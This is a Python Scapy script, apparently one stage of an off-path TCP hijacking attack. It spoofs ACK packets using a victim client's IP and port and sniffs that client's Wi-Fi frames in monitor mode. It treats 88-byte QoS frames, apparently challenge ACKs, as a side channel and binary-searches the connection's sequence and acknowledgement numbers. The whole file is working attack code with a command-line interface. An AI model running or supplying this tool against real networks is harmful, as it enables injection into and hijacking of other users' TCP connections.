
from __future__ import annotations

import time
import threading
import random
from dataclasses import dataclass, field
from enum import IntEnum
from typing import List, Dict, Optional

from scapy.all import sniff, send, IP, TCP, ICMP, Raw, conf

try:
    from scapy.layers.dot11 import Dot11, Dot11QoS  # type: ignore
except Exception:
    Dot11 = None
    Dot11QoS = None

conf.verb = 0


class SeqNextLocation(IntEnum):
    SEQ_NEXT_L = -1
    SEQ_NEXT_W = 0
    SEQ_NEXT_R = 1


@dataclass
class AckFinder:
    # Required parameters
    client_ip: str
    server_ip: str
    client_port: int
    server_port: int
    send_if_name: str
    sniff_if_name: List[str]
    client_mac: str

    # Tunables
    repeat_num: int = 1              # repeat sending each probe pkt
    expected_raw_len: int = 88       # side-channel signature length
    sniff_timeout: float = 0.05      # seconds
    pre_send_sleep: float = 0.005    # seconds
    post_send_wait: float = 0.05     # seconds
    keepalive_count: int = 2         # extra packets to avoid long sniff (as in your code)
    check_sum: int = 2               # repeated checks in seq_check()
    check_line: int = 1              # threshold of hits among check_sum

    # Runtime state / stats
    sent_seq: int = 0
    sent_seq_left_bound: int = -1
    send_num: int = 0
    send_byte: int = 0
    cost_time: float = 0.0
    send_rate: float = 0.0
    result: int = 0
    target_frame_num: int = 0

    max_uint32: int = 0xFFFFFFFF
    max_uint32_half: int = 0xFFFFFFFF >> 1  # 0x7FFFFFFF

    random_seq: int = 0
    random_ack: int = 0


    def _capture_packets(self, out_pkts: List, sniff_if_index: int) -> None:

        iface = self.sniff_if_name[sniff_if_index]
        mac = self.client_mac.lower()
        bpf = f"wlan addr2 {mac}"  # transmitter == client MAC (as in your current file)

        def lfilter(pkt) -> bool:
            if Dot11 is None or not pkt.haslayer(Dot11):
                return False
            d11 = pkt.getlayer(Dot11)
            return hasattr(d11, "addr2") and (d11.addr2 or "").lower() == mac

        try:
            pkts = sniff(iface=iface, timeout=self.sniff_timeout, store=True, filter=bpf)
        except Exception:
            pkts = sniff(iface=iface, timeout=self.sniff_timeout, store=True, lfilter=lfilter)

        out_pkts.extend(pkts)

    def _handle_packets(self, pkts: List) -> None:

        self.target_frame_num = 0

        if Dot11QoS is None:
            return

        for pkt in pkts:
            try:
                if pkt.haslayer(Dot11QoS) and pkt.haslayer(Raw):
                    raw_layer = pkt.getlayer(Raw)
                    raw_load = bytes(getattr(raw_layer, "load", b""))
                    if len(raw_load) == self.expected_raw_len:
                        self.target_frame_num = 1
                        return
            except Exception:
                continue

    # --------------------------
    # Probing logic
    # --------------------------
    def check_seq_list(self, seq_list: List[int]) -> None:

        if not seq_list:
            self.target_frame_num = 0
            print("[AckFinder] Warning: empty seq_list")
            return

        # Build send list
        send_list = []
        for sq in seq_list:
            pkt = (
                IP(src=self.client_ip, dst=self.server_ip)
                / TCP(
                    sport=self.client_port,
                    dport=self.server_port,
                    flags="A",
                    seq=int(sq) & 0xFFFFFFFF,
                    ack=int(self.random_ack) & 0xFFFFFFFF,
                )
                / Raw(b"AAAA")
            )
            for _ in range(self.repeat_num):
                send_list.append(pkt)

        self.send_num += len(send_list)
        self.send_byte += sum(len(bytes(p)) for p in send_list)

        # Start sniff threads
        sniff_pkts_vec: List[List] = [[] for _ in self.sniff_if_name]
        threads: List[threading.Thread] = []
        for i in range(len(self.sniff_if_name)):
            t = threading.Thread(target=self._capture_packets, args=(sniff_pkts_vec[i], i), daemon=True)
            threads.append(t)
            t.start()

        time.sleep(self.pre_send_sleep)

        # Send probes
        for pkt in send_list:
            send(pkt, iface=self.send_if_name, verbose=False)

        time.sleep(self.post_send_wait)

        # Keepalive packets (as in your original code) to avoid long sniffing due to loss
        add_pkt = IP(src=self.client_ip, dst="8.8.8.8") / ICMP(type="echo-request")
        for _ in range(self.keepalive_count):
            send(add_pkt, iface=self.send_if_name, verbose=False)

        # Join sniff threads
        for t in threads:
            t.join(timeout=1.0)

        merged = []
        for v in sniff_pkts_vec:
            merged.extend(v)

        self._handle_packets(merged)

    def seq_check(self, sq: int) -> SeqNextLocation:

        hit_cnt = 0
        for _ in range(self.check_sum):
            self.check_seq_list([int(sq) & 0xFFFFFFFF])
            if self.target_frame_num > 0:
                hit_cnt += 1
                if hit_cnt >= self.check_line:
                    return SeqNextLocation.SEQ_NEXT_L
        return SeqNextLocation.SEQ_NEXT_R

    def find_sent_seq(self) -> None:

        self.sent_seq = int(self.random_seq)
        location = self.seq_check(self.sent_seq)

        if location == SeqNextLocation.SEQ_NEXT_R:
            self.sent_seq = (self.sent_seq - self.max_uint32_half) & 0xFFFFFFFF

        print(f"[AckFinder] initial sent_seq candidate = {self.sent_seq}")

    def find_ack_exact(self) -> None:

        print("[AckFinder] Searching ACK-related boundary …")
        self.find_sent_seq()

        rb = int(self.sent_seq)
        lb = rb - int(self.max_uint32_half)
        ans = -1

        while rb >= lb:
            mid = (rb + lb) // 2
            seq_mid = (mid + self.max_uint32 + 1) & 0xFFFFFFFF if mid < 0 else mid & 0xFFFFFFFF

            check = self.seq_check(seq_mid)
            if check == SeqNextLocation.SEQ_NEXT_L:
                ans = mid
                rb = mid - 1
            else:
                lb = mid + 1

        # Normalize answer
        self.sent_seq_left_bound = ans if ans >= 0 else (ans + (1 << 32))
        # Your original result formula (ACK-related)
        self.result = int(self.sent_seq_left_bound + self.max_uint32_half) & 0xFFFFFFFF

        print(f"[AckFinder] left_bound={self.sent_seq_left_bound}, inferred_result={self.result}")


    def run(self) -> None:
        time_start = time.time()

        self.send_num = 0
        self.send_byte = 0
        self.sent_seq_left_bound = -1
        self.result = 0

        self.random_seq = random.randint(0, self.max_uint32)
        self.random_ack = random.randint(0, self.max_uint32)

        self.find_ack_exact()

        self.cost_time = time.time() - time_start
        self.send_rate = (self.send_byte / self.cost_time) if self.cost_time > 0 else 0.0

        print(f"[AckFinder] inferred ACK-related value: {self.result}")
        print(f"[AckFinder] packets sent: {self.send_num}, bytes: {self.send_byte}")
        print(f"[AckFinder] time: {self.cost_time:.2f}s, rate: {self.send_rate:.2f} B/s")

    def get_result(self) -> int:
        return int(self.result)

    def write_data(self, path: str = "step_ack_data.log") -> None:
        with open(path, "a", encoding="utf-8") as f:
            f.write(f"{self.cost_time} {self.send_rate} {self.send_byte} {self.send_num}\n")



def run_step_ack(config: Dict) -> Dict:
    """
    Main-callable interface for this final ACK inference step.

    Returns:
      {
        "ack_value": int,
        "confidence": float,
        "method": str,
        "details": dict
      }
    """
    af = AckFinder(
        client_ip=config["client_ip"],
        server_ip=config["server_ip"],
        client_port=int(config["client_port"]),
        server_port=int(config["server_port"]),
        send_if_name=config["send_if_name"],
        sniff_if_name=list(config["sniff_if_name"]),
        client_mac=config["client_mac"],
        repeat_num=int(config.get("repeat_num", 1)),
        expected_raw_len=int(config.get("expected_raw_len", 88)),
        sniff_timeout=float(config.get("sniff_timeout", 0.05)),
        pre_send_sleep=float(config.get("pre_send_sleep", 0.005)),
        post_send_wait=float(config.get("post_send_wait", 0.05)),
        keepalive_count=int(config.get("keepalive_count", 2)),
        check_sum=int(config.get("check_sum", 2)),
        check_line=int(config.get("check_line", 1)),
    )

    print("[StepAck] Starting ACK inference")
    af.run()
    af.write_data(config.get("log_path", "step_ack_data.log"))

    return {
        "ack_value": af.get_result(),
        "confidence": 0.95,
        "method": "wifi-challenge-ack",
        "details": {
            "repeat_num": af.repeat_num,
            "expected_raw_len": af.expected_raw_len,
            "check_sum": af.check_sum,
        },
    }



def _parse_args():
    import argparse

    p = argparse.ArgumentParser("Final step: ACK inference via Wi-Fi side channel")
    p.add_argument("--client-ip", required=True)
    p.add_argument("--server-ip", required=True)
    p.add_argument("--client-port", type=int, required=True)
    p.add_argument("--server-port", type=int, required=True)
    p.add_argument("--send-if", required=True)
    p.add_argument("--sniff-if", action="append", required=True)
    p.add_argument("--client-mac", required=True)

    p.add_argument("--repeat-num", type=int, default=1)
    p.add_argument("--expected-raw-len", type=int, default=88)
    p.add_argument("--sniff-timeout", type=float, default=0.05)
    p.add_argument("--check-sum", type=int, default=2)
    p.add_argument("--check-line", type=int, default=1)

    return p.parse_args()


if __name__ == "__main__":
    args = _parse_args()
    cfg = {
        "client_ip": args.client_ip,
        "server_ip": args.server_ip,
        "client_port": args.client_port,
        "server_port": args.server_port,
        "send_if_name": args.send_if,
        "sniff_if_name": args.sniff_if,
        "client_mac": args.client_mac,
        "repeat_num": args.repeat_num,
        "expected_raw_len": args.expected_raw_len,
        "sniff_timeout": args.sniff_timeout,
        "check_sum": args.check_sum,
        "check_line": args.check_line,
    }

    res = run_step_ack(cfg)
    print("[StepAck Result]", res)
